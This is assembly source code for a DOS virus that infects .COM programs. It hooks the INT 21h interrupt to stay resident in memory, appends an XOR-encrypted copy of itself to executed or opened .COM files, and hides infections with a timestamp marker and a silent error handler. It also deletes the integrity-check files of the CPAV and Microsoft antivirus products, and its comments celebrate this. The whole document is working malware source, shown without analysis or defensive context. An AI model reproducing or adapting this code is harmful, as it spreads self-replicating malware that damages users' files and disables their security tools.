               org     100h                                                   
                                                                              
m               proc    far                                                   
                                                                              
length  equ     600                                                           
                                                                              
start:                                                                        
               db      0e9h                    ;fake jump...                  
               dw      0                                                      
begin:                                                                        
               mov     si,101h                                                
               mov     ax,word ptr [si]                                       
                                                                              
               mov     si,ax                   ;length of infectee - 3        
                                                                              
               call    decrypt                                                
                                                                              
;Test for virus installation here!!!!                                         
                                                                              
enc_start:                                                                    
                                                                              
               xor     ax,ax                   ;Segment 0... where the        
               mov     es,ax                   ;interrupt table lurks...      
                                                                              
               mov     ax,word ptr es:[132]           ;Put int21 in i21...    
               mov     word ptr [si+offset i21],ax                            
               mov     ax,word ptr es:[134]                                   
               mov     word ptr [si+offset i21 +2],ax                         
                                                                              
               mov     ah,3dh                                                 
               mov     di,55ffh                                               
               mov     dx,51ffh                                               
               int     21h                                                    
               cmp     di,0ff55h                                              
               je      jend                    ;Already installed             
                                                                              
               mov     ah,61h                  ;Incest!                       
               mov     di,'IN'                                                
               int     21h                                                    
                                                                              
               cmp     di,'NI'                                                
               jne     not_incest                                             
                                                                              
               mov     word ptr [si+offset int21_2],cx                        
               mov     word ptr [si+offset int21_2+2],dx                      
                                                                              
not_incest:                                                                   
                                                                              
               push    cs                                                     
               pop     es                                                     
                                                                              
               mov     ax,cs                                                  
               dec     ax                                                     
               mov     ds,ax                                                  
               cmp     byte ptr ds:[0000],'Z'                                 
               jne     jend                                                   
               mov     ax,ds:[0003]                                           
               sub     ax,100                  ;Decrease memory allocation.   
               mov     ds:[0003],ax                                           
                                                                              
               mov     bx,ax                                                  
               mov     ax,es                                                  
               add     ax,bx           ;Copy virus to                         
               mov     es,ax           ;allocated portion of memory...        
               mov     cx,600                                                 
               push    cs                                                     
               pop     ds                                                     
               push    si                                                     
               add     si,offset begin                                        
               mov     di,103h                                                
               rep     movsb                                                  
                                                                              
;Stolen code ends...                                                          
                                                                              
               pop     si                                                     
                                                                              
               mov     bx,es                                                  
                                                                              
               xor     ax,ax               ;es = segment of vector table      
               mov     es,ax                                                  
                                                                              
               mov     ax,offset int21_handler ;change vector table to point  
               mov     word ptr es:[132],ax    ;to our virus...               
               mov     word ptr es:[134],bx                                   
                                                                              
jend:                                                                         
               mov     ax,cs                                                  
               mov     es,ax                                                  
               mov     ds,ax                                                  
                                                                              
                                                                              
               mov     [100h],byte ptr [si+offset old3]    ;Move original     
               mov     [101h],byte ptr [si+offset old3+1]  ;three back        
                                                           ;to 100h           
                                                                              
               ;There seems to be an error in a86.                            
               ;Which means that when moving "byte ptr [],byte ptr []"        
               ;it moves a word instead.                                      
               ;Hence the above two lines are effective even though           
               ;they look wrong.                                              
                                                                              
                                                                              
               mov     bx,0100h                ;Jump back to user program     
               jmp     bx                                                     
                                                                                     
int21_handler   proc    far                                                   
               cmp     ah,4bh                                                 
               je      not_testing                                            
               cmp     ah,43h                                                 
               je      not_testing                                            
               cmp     ah,56h                                                 
               je      not_testing                                            
               cmp     ax,6c00h                                               
               je      not_testing                                            
                                                                              
               cmp     ah,3dh                                                 
               je      normal                                                 
                                                                              
               cmp     ah,61h                                                 
               je      incest_chk                                             
int_ret:                                                                      
               jmp     dword ptr cs:[i21]                                     
normal:                                                                       
               cmp     di,55ffh            ;This is for testing residency.    
               jne     not_testing                                            
               cmp     dx,51ffh                                               
               jne     not_testing                                            
                                                                              
               mov     di,0ff55h                                              
               iret                                                           
incest_chk:                                                                   
                                                                              
               cmp     di,'IN'                                                
               jne     int_ret                                                
               mov     di,'NI'                   ;Incest Marker...            
               mov     cx,word ptr cs:[int21_2]                               
               mov     dx,word ptr cs:[int21_2 + 2]                           
               iret                              ;Pass original int21h out.   
                                                                              
not_testing:                                                                  
                                                                              
;The working part of the virus goes in here...                                
                                                                              
               push    ax                                                     
               push    bx                                                     
               push    cx                                                     
               push    dx                                                     
               push    si                                                     
               push    di                                                     
               push    ds                                                     
               push    es                                                     
                                                                              
               cmp     ax,6c00h                                               
               jne     find_com                                               
               mov     dx,si                                                  
find_com:                                                                     
               cld                                                            
               push    ds                                                     
               pop     es                                                     
               xor     al,al                                                  
               mov     cx,64   ;Scan 64 bytes.                                
               mov     di,dx                                                  
               repne   scasb   ;Find the zero at the end of the asciiz        
               je      found   ;filename.                                     
                                                                              
               jmp     pop_outa_here                                          
found:                                                                        
                                                                              
               dec     di              ;points to zero                        
                                                                              
               dec     di              ;should point to 'm'                   
               cmp     byte ptr es:[di],'M'                                   
               jne     pop_outa_here                                          
               dec     di                                                     
               cmp     byte ptr es:[di],'O'                                   
               jne     pop_outa_here                                          
               dec     di                    ;This finds the .com extension.  
               cmp     byte ptr es:[di],'C'                                   
               jne     pop_outa_here                                          
               dec     di                                                     
               cmp     byte ptr es:[di],'.'                                   
               jne     pop_outa_here                                          
                                                                              
;set int24h                                                                   
                                                                              
               xor     ax,ax                                                  
               mov     es,ax                                                  
               mov     ax,word ptr es:[144]                                   
               mov     word ptr cs:[i24],ax                                   
                                                                              
               mov     ax,word ptr es:[146]                                   
               mov     word ptr cs:[i24+2],ax                  ;Save int24h   
                                                                              
               mov     word ptr es:[144],offset int24h                        
                                                                              
               mov     es:[146],cs             ;Set int24h to a much cooler   
                                               ;handler.                      
                                                                              
               mov     ax,3d02h                                               
               call    int21h                                                 
               jc      longreturn                                             
                                                                              
               mov     bx,ax                   ;Save file handle              
                                                                              
               mov     ax,4301h                ;Remove write protection       
               mov     cx,0100000b                                            
               call    int21h                                                 
               jc      not_working_right                                      
                                                                              
               mov     ax,5700h                        ;File date & time      
               call    int21h                                                 
               jc      not_working_right                                      
                                                                              
               push    cx                              ;Save file time        
               push    dx                              ; and date             
                                                                              
               and     cl,00011111b                                           
               cmp     cl,00011111b                    ;Check for 62secs      
                                                       ;???11111 = 62 secs    
               jne     infect                                                 
                                                                              
       ;*** Already infected... close file and exit                           
                                                                              
               pop     dx                              ;Restore date & time   
               pop     cx                                                     
                                                                              
                                                                              
Not_working_right:                                                            
                                                                              
               mov     ah,3eh                                                 
               call    int21h                          ; Close file           
                                                                              
longreturn:                                                                   
               ;reset int24h                                                  
                                                                              
               xor     ax,ax                                                  
               mov     es,ax                                                  
               mov     ax,word ptr cs:[i24]                                   
               mov     es:[144],ax                                            
               mov     ax,word ptr cs:[i24+2]                                 
               mov     es:[146],ax                                            
                                                                              
pop_outa_here:                                                                
                                                                              
               pop     es                                                     
               pop     ds                                                     
               pop     di                                                     
               pop     si                                                     
               pop     dx                                                     
               pop     cx                                                     
               pop     bx                                                     
               pop     ax                                                     
                                                                              
               jmp     dword ptr cs:[i21]      ;Return to int 21h like        
                                               ;normal.                       
                                                                              
;Put all data in here...                                                      
       jump    db      0e9h                                                   
       jumpbit dw      0                                                      
                                                                              
old3    db      0cdh,20h,0                                                    
cpav    db      "chklist.cps",0                                               
mscpav  db      "chklist.ms",0                                                
                                                                              
infect:                                                                       
               push    cs                                                     
               pop     ds                                                     
                                                                              
               mov     ah,3fh                                                 
               mov     cx,3                            ;CX = no. to read      
               mov     dx,offset old3                  ;Read into old3        
               call    int21h                          ;Read 1st three bytes  
               jc      quickexit                                              
                                                                              
               mov     al,02h                          ;Seek to end of file   
               call    lseek                           ;End of file           
               jc      quickexit                                              
                                                                              
               push    ax                              ;Save file length      
                                                                              
               inc     byte ptr enc_var                                       
                                                                              
               push    cs                                                     
               pop     es                                                     
               mov     di,859                                                 
               mov     si,offset begin                 ;Copy virus to         
               mov     cx,600                          ;extra part of         
               rep     movsb                           ;memory to encrypt.    
                                                                              
               call    encrypt_decrypt                                        
                                                                              
               mov     dx,859                          ;Address of virus      
               mov     cx,length                       ;Length of virus       
               mov     ah,40h                                                 
               call    int21h                          ;Write virus to file   
                                                                              
               call    encrypt_decrypt                                        
                                                                              
               xor     al,al                           ;Seek to start         
               call    lseek                           ;Start of file         
                                                                              
               pop     ax                              ;Restore file length   
               sub     ax,3                                                   
               mov     cs:[jumpbit],ax                                        
                                                                              
               mov     dx,offset jump                  ;Address of start      
               mov     ah,40h                                                 
               mov     cx,3                            ;Write three bytes     
               call    int21h                          ;Write jump for        
                                                       ;file newly infected.  
                                                                              
Quickexit:     ;Something went wrong...                                       
                                                                              
               mov     ax,5701h                        ;Restore old date      
                                                                              
               pop     dx                              ;Saved date            
               pop     cx                                                     
                                                                              
               or      cx,001fh                        ;Set 62 secs mark      
               call    int21h                          ;orig.time + 62 secs   
                                                                              
               mov     ah,3eh                          ;Close file            
               call    int21h                                                 
                                                                              
;                mov     ax,0b800h                                            
;                mov     es,ax                 ;I use this bit to test its    
;                mov     al,35                 ;working... It is!!!           
;                mov     byte ptr es:[273],al                                 
                                                                              
               mov     ah,41h                  ;Heh, kill CPAV's generic      
               mov     dx,offset cpav          ;integrity checker... :)       
               call    int21h                  ;Hehe... it'll redo the        
                                               ;whole directory now!          
                                                                              
               mov     ah,41h                                                 
               mov     dx,offset mscpav        ;Kill the microsoft version.   
               call    int21h                                                 
                                                                              
               jmp     longreturn                                             
                                                                              
                                                                              
int21_handler   endp                                                          
        
encrypt_decrypt proc    near                                                  
               mov     cx,offset enc_end - offset enc_start                   
               mov     si,869                                                 
               mov     al,byte ptr enc_var                                    
enc_dec:                                                                      
               xor     byte ptr [si],al                                       
               inc     si                                                     
               neg     al                                                     
               not     al                                                     
               loop    enc_dec                                                
                                                                              
               ret                                                            
encrypt_decrypt endp                                                          
       
                                                                              
Lseek   proc    near                                                          
               mov     ah,42h                                                 
               xor     cx,cx                                                  
               xor     dx,dx                                                  
               call    int21h                                                 
               ret                                                            
Lseek   endp                                                                  
      
                                                                              
;Put the interrupts in here...                                                
                                                                              
int24h  proc    near    ;Stops embarassing error messages on write protected  
                       ;diskettes...                                          
                                                                              
               mov     al,3                                                   
               iret                                                           
int24h  endp                                                                  
               i24     dd      0                                              
                                                                              
       
                                                                              
                                                                              
;Crappy Int21h... Not much use calling ourselves now is there ???             
;So use original interrupt...                                                 
                                                                              
int21h  proc    near                                                          
               pushf                                                          
               db      9ah                                                    
               int21_2 dd      0                                              
               ret                                                            
int21h  endp                                                                  
               i21     dd      0                                              
                                                                              
enc_end:                                                                      
      
decrypt proc    near                                                          
               push    si                                                     
               push    cx                                                     
               mov     cx,offset enc_end - offset enc_start                   
               mov     al,byte ptr [si+enc_var]                               
               add     si,offset enc_start                                    
decryption:                                                                   
               xor     byte ptr [si],al                                       
               inc     si                                                     
               neg     al                                                     
               not     al                                                     
               loop    decryption                                             
                                                                              
               pop     cx                                                     
               pop     si                                                     
               ret                                                            
decrypt endp                                                                  

       enc_var db      0                                                      
m               endp                                                          
                                                                              
                                                                              
               end     start                                                  
